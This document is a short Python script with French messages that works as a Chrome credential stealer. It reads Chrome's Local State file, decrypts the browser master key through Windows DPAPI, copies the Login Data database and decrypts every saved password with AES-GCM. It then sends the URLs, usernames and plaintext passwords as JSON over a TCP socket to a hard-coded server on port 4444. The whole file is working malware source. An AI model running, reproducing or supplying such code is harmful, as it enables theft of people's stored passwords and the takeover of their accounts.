import sqlite3
import os
import json
import base64
import shutil
from Cryptodome.Cipher import AES
import win32crypt
import socket
from datetime import datetime

SERVER_IP = "192.168.3.1"
SERVER_PORT = 4444

def get_master_key():
    local_state_path = os.path.expanduser(
        r"~\AppData\Local\Google\Chrome\User Data\Local State"
    )
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

def decrypt_password(encrypted_password, master_key):
    try:
        iv = encrypted_password[3:15]
        encrypted_password = encrypted_password[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(encrypted_password)[:-16].decode()
        return decrypted_password
    except Exception:
        return "Impossible de décrypter"

def get_chrome_passwords():
    db_path = os.path.expanduser(
        r"~\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    )
    if not os.path.exists(db_path):
        print("Base de données non trouvée.")
        return []

    temp_db_path = "temp_login_data.db"
    shutil.copy2(db_path, temp_db_path)

    master_key = get_master_key()
    passwords = []
    try:
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

        for row in cursor.fetchall():
            url, username, encrypted_password = row
            if encrypted_password:
                decrypted_password = decrypt_password(encrypted_password, master_key)
            else:
                decrypted_password = "Aucun mot de passe"
            passwords.append({"url": url, "username": username, "password": decrypted_password})

        conn.close()
    except sqlite3.OperationalError as e:
        print(f"[!] Erreur SQLite : {e}")
    finally:
        if os.path.exists(temp_db_path):
            os.remove(temp_db_path)

    return passwords

def send_passwords_to_server(passwords):
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((SERVER_IP, SERVER_PORT))
        payload = json.dumps({
            "type": "passwords",
            "data": passwords,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        client_socket.send(payload.encode('utf-8'))
        client_socket.close()
        print("Identifiants envoyés.")
    except Exception as e:
        print(f"Erreur lors de l'envoi : {e}")

def main():
    passwords = get_chrome_passwords()
    if passwords:
        send_passwords_to_server(passwords)
    else:
        print("Aucun mot de passe récupéré.")

if __name__ == "__main__":
    main()
